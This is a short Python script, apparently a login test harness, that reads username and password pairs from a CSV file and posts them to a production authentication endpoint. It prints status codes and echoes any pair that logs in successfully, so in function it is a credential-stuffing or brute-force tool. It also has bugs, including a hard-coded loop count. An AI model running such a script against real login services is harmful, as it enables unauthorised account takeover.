import requests
import csv
import sys


useR = []
pasW = []

with open(sys.argv[1], "r") as payload:
    payloadRead = csv.reader(payload)
    next(payloadRead)
    for i in payloadRead:
        useR.append(i[1])
        pasW.append(i[2])

# Replace Unwanted Values
useR = [u.replace("<N/A>", "") for u in useR]
payloadUser = [u.replace("<BLANK>", "") for u in useR]
# print(payloadUser)

pasW = [p.replace("<N/A>", "") for p in pasW]
payloadPassword = [p.replace("<BLANK>", "") for p in pasW]
# print(payloadPassword)

x = len(payloadUser)

print(f"Total Test Case: {x}")
valueStatus = 0
for i in range(120):
    session = requests.session()
    if payloadUser[i] != "" and payloadPassword[i] != "":
        response = session.post("https://prod-dexter.intelligentmachines.xyz/api/auth/token",
                                json={"username": payloadUser[i], "password": payloadPassword[i]})
    print(response.status_code)
    if response.status_code == 200:
        print(f"**** {payloadUser[i]}, {payloadPassword[i]}")
    if response.status_code == 401:
        valueStatus = valueStatus + 1
print(f"Server Responded with Unauthorized: {valueStatus}")
